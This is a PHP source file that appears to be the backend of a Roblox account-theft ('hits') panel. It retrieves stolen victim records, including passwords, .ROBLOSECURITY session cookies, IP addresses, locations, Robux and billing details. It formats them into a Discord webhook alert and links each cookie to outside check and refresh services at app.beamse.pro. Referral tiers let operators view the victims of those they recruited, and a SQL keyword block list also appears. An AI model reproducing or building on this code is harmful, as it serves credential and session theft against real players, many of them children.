<?php
if (session_status() !== PHP_SESSION_ACTIVE) {
    session_name('token');
    session_start();
}

include '../libs/configuration.php';
/* ---- functions this file uses (formerly from libs/functions.php, which is no longer needed) ---- */
if (!function_exists('executeSafeQuery')) {
function executeSafeQuery($sql, $params = []) {
    static $db = null;   // one database connection for the whole page (was: a new one for every query)
    if ($db === null) {
        include $_SERVER['DOCUMENT_ROOT'] . '/libs/connection.php';
    }
    
    // Block suspicious keywords (customize based on your needs)
$blockedKeywords = ['DROP TABLE', 'DELETE FROM', 'TRUNCATE TABLE', 'GRANT ', 'ALTER TABLE', 'CREATE TABLE', 'CREATE DATABASE'];
	foreach ($blockedKeywords as $keyword) {
        if (stripos($sql, $keyword) !== false) {
            throw new Exception("Suspicious SQL operation detected");
        }
    }

    try {
        $stmt = $db->prepare($sql);
        
        // Bind parameters securely
        foreach ($params as $key => $value) {
            $stmt->bindValue(is_int($key) ? $key + 1 : $key, $value, 
                is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR);
        }
        
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log("Database error: " . $e->getMessage());
        return [];
    }
}
}
/* ---- end of the functions from libs/functions.php ---- */
include '../libs/connection.php';

if (session_status() !== PHP_SESSION_ACTIVE) {
    session_name('token');
    session_start();
}

header('Content-Type: application/json; charset=UTF-8');
header('X-Content-Type-Options: nosniff');

if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
    http_response_code(405);
    echo json_encode(['s' => 0]);
    exit();
}

$token = isset($_SERVER['HTTP_X_STORAGE_TOKEN']) ? (string)$_SERVER['HTTP_X_STORAGE_TOKEN'] : '';
if ($token === '' && function_exists('getallheaders')) {
    $hdrs = getallheaders();
    if (is_array($hdrs)) {
        foreach ($hdrs as $hk => $hv) {
            if (strtolower((string)$hk) === 'x-storage-token') {
                $token = (string)$hv;
                break;
            }
        }
    }
}
if (
    $token === '' ||
    strlen($token) !== 64 ||
    !ctype_xdigit($token) ||
    !isset($_SESSION['storage_token']) ||
    !is_string($_SESSION['storage_token']) ||
    strlen($_SESSION['storage_token']) !== 64 ||
    !hash_equals($_SESSION['storage_token'], $token)
) {
    http_response_code(403);
    echo json_encode(['s' => 0]);
    exit();
}

if (!isset($_SESSION['detail_requests']) || !is_array($_SESSION['detail_requests'])) {
    $_SESSION['detail_requests'] = [];
}
$now = time();
$_SESSION['detail_requests'] = array_values(array_filter(
    $_SESSION['detail_requests'],
    function ($t) use ($now) {
        return ($now - (int)$t) < 60;
    }
));
if (count($_SESSION['detail_requests']) >= 30) {
    http_response_code(429);
    echo json_encode(['s' => 0]);
    exit();
}
$_SESSION['detail_requests'][] = $now;

$authCode = trim((string)($_SESSION['auth_code'] ?? ''));
if ($authCode === '') {
    http_response_code(401);
    echo json_encode(['s' => 0]);
    exit();
}

try {
    $rows = executeSafeQuery(
        'SELECT * FROM regular WHERE auth_code = :auth_code LIMIT 2',
        [':auth_code' => $authCode]
    );
} catch (\Throwable $e) {
    echo json_encode(['s' => 0]);
    exit();
}

if (!is_array($rows) || count($rows) !== 1 || !is_array($rows[0])) {
    echo json_encode(['s' => 0]);
    exit();
}

$userData = $rows[0];
$storedAuthCode = (string)($userData['auth_code'] ?? '');
$link_id = (int)($userData['link_id'] ?? 0);
if ($storedAuthCode === '' || !hash_equals($storedAuthCode, $authCode) || $link_id <= 0) {
    echo json_encode(['s' => 0]);
    exit();
}

$__thRaw = $userData['triplehook'] ?? ($_SESSION['triplehook'] ?? 0);
$isTriplehook = ($__thRaw === true || $__thRaw === 1 || $__thRaw === '1' || (is_string($__thRaw) && in_array(strtolower(trim((string)$__thRaw)), ['1','true','yes','on'], true)));
if (!$isTriplehook) {
    try {
        $thCheck = executeSafeQuery('SELECT 1 FROM triplehook_data WHERE link_id = :link_id LIMIT 1', [':link_id' => $link_id]);
        if (!empty($thCheck)) $isTriplehook = true;
    } catch (\Throwable $e) {}
}
$hit_id = isset($_GET['id']) ? (int)$_GET['id'] : 0;
if ($hit_id <= 0) {
    echo json_encode(['s' => 0]);
    exit();
}

if ($isTriplehook) {
    $scopeSql = '(
        SELECT :self_id AS link_id
        UNION
        SELECT link_id FROM regular WHERE referred_by = :ref_id
        UNION
        SELECT r2.link_id
        FROM regular r2
        INNER JOIN triplehook_data td ON td.link_id = r2.referred_by
        INNER JOIN regular r1 ON r1.link_id = td.link_id
        WHERE r1.referred_by = :ref_id2
    )';
    $hitResult = executeSafeQuery(
        "SELECT h.* FROM hits h
         WHERE h.id = :hit_id
           AND h.link_id IN $scopeSql
         LIMIT 1",
        [
            ':hit_id' => $hit_id,
            ':self_id' => $link_id,
            ':ref_id' => $link_id,
            ':ref_id2' => $link_id
        ]
    );
} else {
    $hitResult = executeSafeQuery(
        "SELECT h.* FROM hits h
         INNER JOIN regular owner ON owner.link_id = h.link_id AND owner.auth_code = :auth_code
         WHERE h.id = :hit_id
           AND h.link_id = :link_id
         LIMIT 1",
        [
            ':hit_id' => $hit_id,
            ':link_id' => $link_id,
            ':auth_code' => $authCode
        ]
    );
}

if (!is_array($hitResult) || empty($hitResult) || !is_array($hitResult[0])) {
    echo json_encode(['s' => 0]);
    exit();
}
$hit = $hitResult[0];
$hitOwner = (int)($hit['link_id'] ?? 0);
if ($hitOwner <= 0) {
    echo json_encode(['s' => 0]);
    exit();
}
if ($hitOwner !== $link_id) {
    if (!$isTriplehook) {
        echo json_encode(['s' => 0]);
        exit();
    }
    try {
        $owned = executeSafeQuery(
            'SELECT 1 FROM regular WHERE link_id = :hid AND (
                referred_by = :me
                OR referred_by IN (
                    SELECT td.link_id FROM triplehook_data td
                    INNER JOIN regular r ON r.link_id = td.link_id
                    WHERE r.referred_by = :me2
                )
            ) LIMIT 1',
            [':hid' => $hitOwner, ':me' => $link_id, ':me2' => $link_id]
        );
    } catch (\Throwable $e) {
        $owned = [];
    }
    if (empty($owned)) {
        echo json_encode(['s' => 0]);
        exit();
    }
}

$hitLinkId = $hit['link_id'] ?? '';
$hitterInfo = [];
$embedColor = 0xFF0000;
if (!empty($hitLinkId)) {
    $hr = executeSafeQuery(
        'SELECT discord_username, discord_avatar, discord_id, referred_by FROM regular WHERE link_id = :lid LIMIT 1',
        [':lid' => $hitLinkId]
    );
    if (!empty($hr) && is_array($hr[0])) {
        $hitterInfo = $hr[0];
    }
}

$discordAvatar = '';
if (!empty($hitterInfo['discord_avatar'])) {
    if (strpos($hitterInfo['discord_avatar'], 'https://') === 0) {
        $discordAvatar = $hitterInfo['discord_avatar'];
    } else {
        $ext = (strpos($hitterInfo['discord_avatar'], 'a_') === 0) ? 'gif' : 'png';
        $discordAvatar = 'https://cdn.discordapp.com/avatars/' . ($hitterInfo['discord_id'] ?? '') . '/' . $hitterInfo['discord_avatar'] . '.' . $ext;
    }
}

$u = $hit['username'] ?? 'Unknown';
$pw = $hit['password'] ?? '';
$ck = $hit['cookie'] ?? '';
$av = $hit['avatar_url'] ?? '';
$uid = $hit['user_id'] ?? '0';
$age = (int)($hit['account_age'] ?? 0);
$rob = $hit['robux'] ?? '0';
$rp = $hit['robux_pending'] ?? '0';
$rap = $hit['rap'] ?? '0';
$lim = $hit['limited_count'] ?? '0';
$sum = $hit['summary'] ?? '0';
$cr = $hit['credit'] ?? 0;
$crr = $hit['credit_robux'] ?? '0';
$pc = $hit['payment_count'] ?? '0';
$prem = $hit['premium'] ?? 'False';
$premR = $hit['premium_robux'] ?? '0';
$ev = $hit['email_verified'] ?? false;
$tv = $hit['twostep_authenticator'] ?? false;
$ko = $hit['korblox'] ?? 'False';
$he = $hit['headless'] ?? 'False';
$kd = $hit['korblox_death'] ?? 'False';
$go = $hit['group_owned'] ?? '0';
$gf = $hit['group_funds'] ?? '0';
$gp = $hit['group_pending'] ?? '0';
$am = $hit['adopt_me'] ?? 'False';
$mm = $hit['murder_mystery_2'] ?? 'False';
$ps = $hit['pet_simulator_99'] ?? 'False';
$ga = $hit['gp_adopt_me'] ?? 0;
$gm = $hit['gp_murder_mystery_2'] ?? 0;
$gps = $hit['gp_blox_fruits'] ?? 0;
$ip = $hit['ip_address'] ?? '';
$co = $hit['country'] ?? 'Unknown';
$cc = strtolower($hit['country_code'] ?? 'us');
$ci = $hit['city'] ?? '';
$re = $hit['region'] ?? '';
$ca = $hit['created_at'] ?? '';
$manualKey = $hit['manual_key'] ?? '';

$evB = (is_bool($ev) ? $ev : (strtolower((string)$ev) === 'true' || $ev === '1' || $ev === 1));
$tvB = (is_bool($tv) ? $tv : (strtolower((string)$tv) === 'true' || $tv === '1' || $tv === 1));
$eT = $evB ? "Set (Verified {1485976733063581777})" : "Not Set";
$tT = $tvB ? "Enabled" : "Disabled";
if (!empty($manualKey)) {
    $nT = "**```\n" . $manualKey . "\n```**";
} else {
    $nT = $tvB ? "Waiting to enter code..." : "2FA is not enabled.";
}
$pB = strtolower((string)$prem) !== 'false' && $prem !== '0' && $prem !== '';
$pT = $pB ? "True ({$premR} {1302366642994548768})" : "False (0 {1302366642994548768})";
$cD = '$' . number_format((float)$cr, 0, '.', ',');
$pL = "https://www.roblox.com/users/{$uid}/profile";
$rL = "https://www.rolimons.com/player/{$uid}";
$ckL = "https://app.beamse.pro/apis/checkCookie?a=" . urlencode($ck);
$bL = "https://app.beamse.pro/apis/refreshCookie?a=" . urlencode($ck);
$aS = $age >= 0 ? "13+" : "<13";
$ts = !empty($ca) ? date('c', strtotime($ca)) : date('c');

$embed = [
    "content" => "@everyone **New Hits Logs**",
    "embeds" => [
        [
            "description" => "{1464657537587609874}[**Refresh Cookie**]({$bL}) | {1464657537587609874}[**Check Cookie**]({$ckL}) | {1471766427995213834}[**Profile**]({$pL}) | [**{1308817245954244668}olimons**]({$rL})\n\nAccount Created : {$co}\nIP Location : **[{$co}](https://ipinfo.io/{$ip})**",
            "timestamp" => $ts,
            "color" => $embedColor,
            "author" => ["name" => "{$u} | {$aS}", "icon_url" => $av],
            "thumbnail" => ["url" => $av],
            "fields" => [
                ["name" => "{1468259871693475930}Username", "value" => $u, "inline" => false],
                ["name" => "{1302364582857150705}Password", "value" => $pw ?: 'N/A', "inline" => false],
                ["name" => "About User", "value" => "`Account Age :` `" . number_format($age, 0, '.', '.') . "` `Days`", "inline" => false],
                ["name" => "{1468265637129228311} Robux", "value" => "Balance {$rob} {1468260125012656309}\nPending {$rp} {1302366642994548768}", "inline" => true],
                ["name" => "{1468260334899957790} Rap", "value" => "Rap : {$rap} {1302368058869809172}\nOwned Item : {$lim} {1468260421818384647}", "inline" => true],
                ["name" => "{1302362291152486533} Summary", "value" => (string)$sum, "inline" => true],
                ["name" => "{1468260833682526422} Billing", "value" => "Credit {$cD} {1468260954247663880}\nConvert {$crr} {1468260978553786400}\nSaved Payment {$pc} {1468261003878727841}", "inline" => true],
                ["name" => "Passes | Played", "value" => "{1485974901696495736} __**{$gps}**__ | {$ps}\n{1485972327043829840} __**{$ga}**__ | {$am}\n{1485972379120308335} __**{$gm}**__ | {$mm}", "inline" => true],
                ["name" => "{1468260371281350871} Settings", "value" => "{1468243127612477484} {$eT}\n{1468262253563478128} {$tT}", "inline" => true],
                ["name" => "{1468262296030675169} Premium", "value" => $pT, "inline" => true],
                ["name" => "{1468262352364376325} Groups", "value" => "Balance {$gf} {1302365333117468715}\nPending {$gp} {1302366642994548768}\nOwned {$go} {1485978049051754516}", "inline" => true],
                ["name" => "Korblox / Headless", "value" => "{1308831163342651503} {$kd}\n{1467578090396844072} {$he}\n{1468245329848565983} {$ko}", "inline" => true],
                ["name" => "{1468248412519534704}Notification", "value" => $nT, "inline" => false]
            ]
        ],
        [
            "description" => "**.ROBLOSECURITY**\n**```\n" . (str_starts_with($ck, "_|WARNING:-DO-NOT-SHARE-THIS") ? "" : "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_") . $ck . "\n```**",
            "color" => $embedColor,
            "footer" => [
                "text" => $hitterInfo['discord_username'] ?? 'Unknown Hitter',
                "icon_url" => !empty($discordAvatar) ? $discordAvatar : "https://cdn.discordapp.com/embed/avatars/0.png"
            ],
            "thumbnail" => ["url" => "https://media.discordapp.net/attachments/1464597073549852765/1464640559854653450/images__4_-removebg-preview.png"]
        ]
    ],
    "username" => "HIT",
    "avatar_url" => $av
];

$json = json_encode($embed, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
$key = (string)$_SESSION['storage_token'];
$enc = '';
$kl = strlen($key);
for ($i = 0, $n = strlen($json); $i < $n; $i++) {
    $enc .= chr(ord($json[$i]) ^ ord($key[$i % $kl]));
}
echo json_encode(['s' => 1, 'd' => base64_encode($enc)]);